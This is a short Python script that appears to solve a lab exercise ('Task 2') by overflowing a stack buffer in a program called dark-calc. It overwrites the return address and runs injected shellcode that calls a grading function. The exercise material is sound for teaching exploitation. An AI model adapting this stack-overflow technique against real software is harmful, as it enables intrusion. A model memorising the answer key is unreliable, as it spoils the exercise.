#!/usr/bin/env python3
"""Task 2: execute injected code on dark-calc's fixed executable stack."""
import struct
import sys

STACK_TOP = 0x721000801000
BUFFER = STACK_TOP - 0x30
GRADE_EVAL = 0x401a87
SHELLCODE = (
    b"\xbf\x04\x00\x00\x00"       # mov edi, 4
    + b"\xb8" + struct.pack("<I", GRADE_EVAL)
    + b"\xff\xd0"                   # call rax
)

assert len(SHELLCODE) == 12
payload = b"A" * 24 + struct.pack("<Q", BUFFER + 32) + SHELLCODE + b"\n"

sys.stdout.buffer.write(payload)
